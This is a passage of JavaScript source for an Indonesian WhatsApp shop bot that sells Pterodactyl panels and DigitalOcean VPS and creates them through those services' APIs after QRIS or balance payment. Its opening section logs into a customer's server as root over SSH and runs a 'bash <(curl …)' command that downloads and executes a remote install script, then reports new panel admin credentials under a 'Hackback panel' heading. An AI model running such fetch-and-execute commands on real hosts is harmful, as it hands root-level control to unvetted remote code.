           *ァ Expired :* 5 menit
      
          *Note :* 
          Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
          Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
      
          Ketik *.batalbeli* untuk membatalkan
          `;
      let msgQr = await gisnaxd.sendMessage(m.chat, {
          footer: ` ${botname}`,
          buttons: [
              {
                  buttonId: `.batalbeli`,
                  buttonText: { displayText: 'Batalkan Pembelian' },
                  type: 1
              }
          ],
          headerType: 1,
          viewOnce: true,
          image: {url: get.data.result.qrImageUrl}, 
          caption: teks3,
          contextInfo: {
              mentionedJid: [m.sender]
          },
      });

      // Simpan status transaksi sementara
      db.users[m.sender].status_deposit = true;
      db.users[m.sender].pendingPayment = {
          transactionId: get.data.result.transactionId,
          amount: get.data.result.amount,
          chat: m.chat
      };
      
      setTimeout(async () => {
          if (db.users[m.sender].status_deposit) {
              await gisnaxd.sendMessage(m.chat, {text: "❌ QRIS pembayaran telah expired!"}, {quoted: msgQr});
              delete db.users[m.sender].status_deposit;
              delete db.users[m.sender].pendingPayment;
          }
      }, 300000);

      // Cek status pembayaran secara berkala
      let checkInterval = setInterval(async () => {
          if (!db.users[m.sender].status_deposit) {
              clearInterval(checkInterval);
              return;
          }
          try {
              const checkPayment = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`);
              if (checkPayment.data.status === "PAID") {
                  db.users[m.sender].status_deposit = false;
                  clearInterval(checkInterval);
                  m.reply("✅ Pembayaran berhasil diterima!");

                  
                  // Jalankan proses instalasi panel setelah pembayaran berhasil
                  const newuser = "admin" + getRandom("");
                  const newpw = "admin" + getRandom("");
                  
                  const gisnaxdSettings = {
                      host: ipvps,
                      port: '22',
                      username: 'root',
                      password: passwd
                  };
                  
                  const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
                  const ress = new Client();
                  
                  ress.on('ready', () => {
                      ress.exec(command, (err, stream) => {
                          if (err) throw err;
                          stream.on('close', async (code, signal) => {    
                              let teks = `
*Hackback panel sukses *
*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`;
                              await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: m});
                              ress.end();
                          }).on('data', async (data) => {
                              await console.log(data.toString());
                          }).stderr.on('data', (data) => {
                              stream.write("skyzodev\n");
                              stream.write("7\n");
                              stream.write(`${newuser}\n`);
                              stream.write(`${newpw}\n`);
                          });
                      });
                  }).on('error', (err) => {
                      console.log('gisnaxdection Error: ' + err);
                      m.reply('Katasandi atau IP tidak valid');
                  }).gisnaxdect(gisnaxdSettings);
              }
          } catch (err) {
              console.error("Gagal mengecek status pembayaran:", err);
          }
      }, 10000);
  }
}
break;

//========Produk-Saldo
case "produk-saldo": {
await runLoading(m);
await gisnaxd.sendMessage(m.chat, {
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  buttons: [
    {
      buttonId: 'action',
      buttonText: { displayText: 'ini pesan interactiveMeta' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '📒Produk Saldo Only',
          sections: [
            {
              title: 'Produk Saldo Only',
              rows: [
                {
                  title: '🏷Buy Panel',
                  id: '.buypanelsaldo'
                },
                {
                  title: '🏷Buy Vps',
                  id: '.buyvpssaldo'
                },                
                {
                  title: '🏷List Script',
                  id: '.listscript'
                },
                {
                  title: '🏷Deposit',
                  id: '.deposit'
                }
              ]
            }
          ]
        })
      }
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: { url: global.image.menu }, 
  caption: `┏━━━〔 🤖 *INFORMASI BOT* 🤖 〕━━━┓
┃ 🔹 *Bot Name:* ${global.botname}  
┃ 🔹 *Version:* 4.0.0
┃ 🔹 *Mode:* *${gisnaxd.public ? "Public" : "Self"}*  
┃ 🔹 *Uptime:* ${runtime(process.uptime())}  
┃ 🔹 *Owner:* @${global.owner}  
┃ 🔹 *Kontak:* wa.me/${global.owner}  
┃ 🔹 *Support:* t.me/Qpyakn2  
┃ 🔹 *Powered by:* BOTSHOP V4 🚴  
┃
┗━━━━━━━━━━━━━━━━━━━  
🚀 *Bot ini siap membantu Anda 24/7!*`
}, { quoted: qlist })
}
break
//buypanel
case "buypanelsaldo": {
return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Produk Panel',
          sections: [
            {
              title: 'List Produk Qoupay',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'PANEL PRIVATE', 
                  description: "Panel Private",
                  id: `.buypanelprivsaldo`
                },
                {
                  title: 'PANEL PUBLIC', 
                  description: "Panel Public",
                  id: `.buypanelpubsaldo`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Panel Apa Yang Anda Ingin Pillih\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break
//===============Publix
case "buypanelpubsaldo": {
if (m.isGroup) return Reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Ram Panel',
          sections: [
            {
              title: 'List Ram Server Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram Unlimited', 
                  description: "Rp11.000", 
                  id: '.buypanelpubsaldo unlimited'
                },
                {
                  title: 'Ram 1GB', 
                  description: "Rp1000", 
                  id: '.buypanelpubsaldo 1gb'
                },
                {
                  title: 'Ram 2GB', 
                  description: "Rp2000", 
                  id: '.buypanelpubsaldo 2gb'
                },
                {
                  title: 'Ram 3GB', 
                  description: "Rp3000", 
                  id: '.buypanelpubsaldo 3gb'
                },
                {
                  title: 'Ram 4GB', 
                  description: "Rp4000", 
                  id: '.buypanelpubsaldo 4gb'
                },      
                {
                  title: 'Ram 5GB', 
                  description: "Rp5000", 
                  id: '.buypanelpubsaldo 5gb'
                },       
                {
                  title: 'Ram 6GB', 
                  description: "Rp6000", 
                  id: '.buypanelpubsaldo 6gb'
                },
                {
                  title: 'Ram 7GB', 
                  description: "Rp7000", 
                  id: '.buypanelpubsaldo 7gb'
                },        
                {
                  title: 'Ram 8GB', 
                  description: "Rp8000", 
                  id: '.buypanelpubsaldo 8gb'
                },   
                {
                  title: 'Ram 9GB', 
                  description: "Rp9000", 
                  id: '.buypanelpubsaldo 9gb'
                },       
                {
                  title: 'Ram 10GB', 
                  description: "Rp10.000", 
                  id: '.buypanelpubsaldo 10gb'
                },                                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: ` ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Panel Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "2000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "3000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "4000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "5000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "6000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "7000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "8000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "9000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "10000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return Reply(teks)

const saldoPengguna = await cekSaldo(m.sender);
    if (saldoPengguna < Obj.harga) {
        return m.reply("❌ Saldo Anda tidak cukup untuk melakukan pembelian ini!");
    }

    // Kurangi saldo pengguna
    await kurangiSaldo(m.sender, Obj.harga);

    // Kirim pesan konfirmasi pembelian
    let messageText = `
*Pembelian Panel Berhasil!*

*ID Transaksi:* ${generateRandomId()}
*Total Pembayaran:* Rp${Obj.harga}
*Barang:* Panel Pterodactyl
*Spesifikasi:* ${cmd}
*Status:* Pembayaran menggunakan saldo
`;

    await gisnaxd.sendMessage(m.sender, { text: messageText });
let transaksiSukses = {
  id: db.users[m.sender].saweria.idDeposit,
  user: m.sender,
  amount: db.users[m.sender].saweria.amount,
  method: "Saldo"
};

await sendPaymentNotificationToOwner(transaksiSukses);
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}*
* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}*
* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("./akunpanel.txt", tekspanel)
await gisnaxd.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: tekspanel}, {quoted: null})
await fs.unlinkSync("./akunpanel.txt")
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
break
//==========PanelPriv
case "buypanelprivsaldo": {
if (m.isGroup) return Reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Ram Panel',
          sections: [
            {
              title: 'List Ram Server Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram Unlimited PROMO♨️', 
                  description: "Rp12.000", 
                  id: '.buypanelprivsaldo unlimited'
                },
                {
                  title: 'Ram 1GB', 
                  description: "Rp2000", 
                  id: '.buypanelprivsaldo 1gb'
                },
                {
                  title: 'Ram 2GB', 
                  description: "Rp4000", 
                  id: '.buypanelprivsaldo 2gb'
                },
                {
                  title: 'Ram 3GB', 
                  description: "Rp6000", 
                  id: '.buypanelprivsaldo 3gb'
                },
                {
                  title: 'Ram 4GB', 
                  description: "Rp8000", 
                  id: '.buypanelprivsaldo 4gb'
                },      
                {
                  title: 'Ram 5GB', 
                  description: "Rp10000", 
                  id: '.buypanelprivsaldo 5gb'
                },       
                {
                  title: 'Ram 6GB', 
                  description: "Rp12000", 
                  id: '.buypanelprivsaldo 6gb'
                },
                {
                  title: 'Ram 7GB', 
                  description: "Rp14000", 
                  id: '.buypanelprivsaldo 7gb'
                },        
                {
                  title: 'Ram 8GB', 
                  description: "Rp16000", 
                  id: '.buypanelprivsaldo 8gb'
                },   
                {
                  title: 'Ram 9GB', 
                  description: "Rp18000", 
                  id: '.buypanelprivsaldo 9gb'
                },       
                {
                  title: 'Ram 10GB', 
                  description: "Rp20.000", 
                  id: '.buypanelprivsaldo 10gb'
                },                                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: ` ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Panel Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "2000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "2000"
Obj.cpu = "60"
Obj.harga = "4000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "3000"
Obj.cpu = "80"
Obj.harga = "6000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "4000"
Obj.cpu = "100"
Obj.harga = "8000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "5000"
Obj.cpu = "120"
Obj.harga = "10000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "6000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "7000"
Obj.cpu = "160"
Obj.harga = "12000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "8000"
Obj.cpu = "180"
Obj.harga = "14000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "9000"
Obj.cpu = "200"
Obj.harga = "16000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "10000"
Obj.cpu = "220"
Obj.harga = "18000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "12000"
} else return Reply(teks)

const saldoPengguna = await cekSaldo(m.sender);
    if (saldoPengguna < Obj.harga) {
        return m.reply("❌ Saldo Anda tidak cukup untuk melakukan pembelian ini!");
    }

    // Kurangi saldo pengguna
    await kurangiSaldo(m.sender, Obj.harga);

    // Kirim pesan konfirmasi pembelian
    let messageText = `
*Pembelian Panel Berhasil!*

*ID Transaksi:* ${generateRandomId()}
*Total Pembayaran:* Rp${Obj.harga}
*Barang:* Panel Pterodactyl
*Spesifikasi:* ${cmd}
*Status:* Pembayaran menggunakan saldo
`;

    await gisnaxd.sendMessage(m.sender, { text: messageText });
let transaksiSukses = {
  id: db.users[m.sender].saweria.idDeposit,
  user: m.sender,
  amount: db.users[m.sender].saweria.amount,
  method: "Saldo"
};

await sendPaymentNotificationToOwner(transaksiSukses);
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestid}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}*
* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}*
* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("./akunpanel.txt", tekspanel)
await gisnaxd.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: tekspanel}, {quoted: null})
await fs.unlinkSync("./akunpanel.txt")
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
break
//======BuyVpsSaldo
case "buyvpssaldo": {
    if (m.isGroup) return m.reply("Pembelian VPS hanya bisa di dalam private chat");
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    if (!text) {
        // Kirim pesan untuk memilih spesifikasi VPS
        return gisnaxd.sendMessage(m.chat, {
            buttons: [
                {
                    buttonId: 'action',
                    buttonText: { displayText: 'ini pesan interactiveMeta' },
                    type: 4,
                    nativeFlowInfo: {
                        name: 'single_select',
                        paramsJson: JSON.stringify({
                            title: 'Pilih Spesifikasi VPS',
                            sections: [
                                {
                                    title: 'List Ram Server VPS',
                                    highlight_label: 'Recommended',
                                    rows: [
                                        { title: 'Ram 16 & Cpu 4', description: "Rp60.000", id: '.buyvpssaldo 4' },
                                        { title: 'Ram 2 & Cpu 1', description: "Rp25.000", id: '.buyvpssaldo 1' },
                                        { title: 'Ram 4 & Cpu 2', description: "Rp35.000", id: '.buyvpssaldo 2' },
                                        { title: 'Ram 8 & Cpu 4', description: "Rp50.000", id: '.buyvpssaldo 3' }
                                    ]
                                }
                            ]
                        })
                    }
                }
            ],
            footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V3`,
            headerType: 1,
            viewOnce: true,
            text: "Pilih Ram Server VPS Yang Tersedia\n",
            contextInfo: {
                isForwarded: true,
                mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
            },
        }, { quoted: m });
    }

    tek = text.toLowerCase();
    let Obj = {};

    if (tek == "1") {
    Obj.images = "s-1vcpu-2gb";
    Obj.harga = 25000;
} else if (tek == "2") {
    Obj.images = "s-2vcpu-4gb";
    Obj.harga = 35000;
} else if (tek == "3") {
    Obj.images = "s-4vcpu-8gb";
    Obj.harga = 50000  
} else if (tek == "4") {
    Obj.images = "s-4vcpu-16gb";
    Obj.harga = 60000;
} else return m.reply("❌ Pilihan tidak valid!");

// Cek saldo pengguna
const saldoPengguna = await cekSaldo(m.sender);
if (saldoPengguna < Obj.harga) {
    return m.reply("❌ Saldo Anda tidak cukup untuk melakukan pembelian ini!");
}

// Kurangi saldo pengguna
await kurangiSaldo(m.sender, Obj.harga);

// Kirim pesan konfirmasi pembelian
let messageText = `
*Pembelian VPS Berhasil!*

*ID Transaksi:* ${generateRandomId()}
*Total Pembayaran:* Rp${Obj.harga}
*Barang:* VPS Digital Ocean
*Spesifikasi:* ${tek}
*Status:* Pembayaran menggunakan saldo
`;

await gisnaxd.sendMessage(m.sender, { text: messageText });
let transaksiSukses = {
    id: db.users[m.sender].saweria.idDeposit,
    user: m.sender,
    amount: db.users[m.sender].saweria.amount,
    method: "Saldo"
};

await sendPaymentNotificationToOwner(transaksiSukses);

// Proses pembuatan VPS
let hostname = "#" + m.sender.split("@")[0];
try {
    let dropletData = {
        name: hostname,
        region: "sgp1",
        size: Obj.images,
        image: 'ubuntu-20-04-x64',
        ssh_keys: null,
        backups: false,
        ipv6: true,
        user_data: null,
        private_networking: null,
        volumes: null,
        tags: ['T']
    };

    let password = await generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': "Bearer " + global.apiDigitalOcean
        },
        body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
        let dropletConfig = responseData.droplet;
        let dropletId = dropletConfig.id;

        // Menunggu hingga VPS selesai dibuat
        await m.reply(`Memproses pembuatan VPS...`);
        await new Promise(resolve => setTimeout(resolve, 60000));

        // Mengambil informasi lengkap tentang VPS
        let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean
            }
        });

        let dropletData = await dropletResponse.json();
        let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
            ? dropletData.droplet.networks.v4[0].ip_address 
            : "Tidak ada alamat IP yang tersedia";

        let messageText = `VPS berhasil dibuat!\n\n`;
        messageText += `ID: ${dropletId}\n`;
        messageText += `IP VPS: ${ipVPS}\n`;
        messageText += `Password: ${password}`;

        await gisnaxd.sendMessage(m.sender, { text: messageText });
    } else {
        throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
} catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}
}
break;

//======Jangan Di Otak Atik Kalo Gak Eror
case "stok": {
  const username = `@${m.sender.split("@")[0]}`; // Mengambil nomor tanpa @s.whatsapp.net

  // Ucapan kepada user dengan sentuhan eksklusif
  let pesan = `🌟 *Halo, ${username}!* 🌟\n
Selamat datang di *${global.botname}* kami! 🛍️✨
Kami menyediakan produk berkualitas dengan harga terbaik 🔥\n
Ketik *.menu* untuk kembali ke Home.
Ketik *.gisnaxd* untuk melihat daftar produk kami!`;

  // Kirim pesan dengan quoted
  gisnaxd.sendMessage(m.chat, { text: pesan }, { quoted: qlist });
}
break;

case "katalog": {
  const fs = require("fs");

  // Load data katalog dari stok.json
  const katalogPath = "./library/database/stok.json";
  let katalogData = fs.existsSync(katalogPath)
    ? JSON.parse(fs.readFileSync(katalogPath, "utf8"))
    : {};

  if (Object.keys(katalogData).length === 0) {
    return gisnaxd.sendMessage(m.chat, { text: "⚠ Maaf, katalog saat ini kosong. Silakan cek kembali nanti." });
  }

  let pesan = `✨ Selamat Datang di Katalog Produk Kami! ✨\n\n`;
  pesan += `🚀 Kenapa belanja di sini?\n`;
  pesan += `✅ Produk langsung dikirim setelah pembayaran\n`;
  pesan += `✅ Proses cepat & otomatis\n`;
  pesan += `✅ Pembayaran mudah via QRIS\n`;
  pesan += `✅ Harga terbaik & layanan 24/7\n\n`;
  pesan += `🛒 Berikut adalah daftar produk kami:\n`;

  for (const [kode, data] of Object.entries(katalogData)) {
    pesan += `\n📌 *${data.nama}* - *Rp${data.harga.toLocaleString()}*\n`;
    pesan += `✅ Stok: ${data.stok} | 🔥 Terjual: ${data.terjual}\n`;
    pesan += `🛍 Ketik *.detailproduk ${kode}* untuk melihat detail\n`;
    pesan += `──────────────────────────\n`;
  }

  gisnaxd.sendMessage(m.chat, { text: pesan });
}
break;

case "detailproduk": {
    const fs = require("fs");
    const katalogPath = "./library/database/stok.json";
    let katalogData = fs.existsSync(katalogPath)
        ? JSON.parse(fs.readFileSync(katalogPath, "utf8"))
        : {};

    const kodeProduk = args[0];
    let jumlah = parseInt(args[1]) || 1; // Default jumlah 1

    if (!katalogData[kodeProduk]) {
        return gisnaxd.sendMessage(m.chat, { text: "⚠️ Produk tidak ditemukan!" });
    }

    const data = katalogData[kodeProduk];

    if (jumlah < 1) jumlah = 1;
    if (jumlah > data.stok) jumlah = data.stok;

    let pesan = `🛍️ *Detail Produk*\n\n`
        + `📌 *Nama:* ${data.nama}\n`
        + `💰 *Harga:* Rp${data.harga.toLocaleString()}\n`
        + `✅ *Stok Tersedia:* ${data.stok}\n`
        + `🔥 *Terjual:* ${data.terjual}\n\n`
        + `📦 *Jumlah Pembelian:* ${jumlah}\n\n`
        + `Gunakan perintah berikut untuk mengubah jumlah:\n`
        + `➖ Kurangi: \`.detailproduk ${kodeProduk} ${jumlah - 1}\`\n`
        + `➕ Tambah: \`.detailproduk ${kodeProduk} ${jumlah + 1}\`\n`
        + `🛒 Beli Sekarang: \`.buy ${kodeProduk} ${jumlah}\``;

    gisnaxd.sendMessage(m.chat, { text: pesan });
}
break;

case "buy": {
  const fs = require("fs");
  const axios = require("axios");
  
  if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan di private chat.");

  const args = text.split(" ");
  if (args.length < 1 || args.length > 2) return m.reply("*Format Salah*\nContoh: *.buy viu* atau *.buy viu 2*");

  const product = args[0].toUpperCase();
  const jumlah = args.length === 2 ? parseInt(args[1]) : 1;

  if (!jumlah || jumlah <= 0) return m.reply("Jumlah pembelian harus lebih dari 0.");

  const akunPath = "./library/database/stok.json";
  if (!fs.existsSync(akunPath)) return m.reply("⚠️ Database stok tidak ditemukan!");

  let akunData = JSON.parse(fs.readFileSync(akunPath, "utf8"));
  if (!akunData[product] || akunData[product].stok < jumlah) {
    return m.reply(`Maaf, stok untuk ${product} tidak mencukupi!`);
  }

  const harga = akunData[product].harga;
  if (!harga) return m.reply("Harga untuk produk ini belum ditentukan!");

  const tambahanUnik = Math.floor(Math.random() * 99) + 1;
  const totalAmount = harga * jumlah + tambahanUnik;

  const UrlQr = global.qrisOrderKuota;
  const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${totalAmount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`);
  const paymentData = get.data.result;

  const toIDR = (number) => new Intl.NumberFormat("id-ID", { style: "currency", currency: "IDR" }).format(number);

  const teks3 = `✅ *INFORMASI PEMBAYARAN* ✅\n\n` +
    `📌 ID: ${paymentData.transactionId}\n` +
    `💰 Total Pembayaran: Rp${await toIDR(paymentData.amount)}\n` +
    `📦 Barang: ${product}\n` +
    `⏳ Expired: 5 menit\n\n` +
    `⚠️ Qris pembayaran hanya berlaku dalam 5 menit! Jika pembayaran berhasil, bot akan otomatis mengirimkan akun.`;

  let msgQr = await gisnaxd.sendMessage(m.chat, {
    image: { url: paymentData.qrImageUrl },
    caption: teks3,
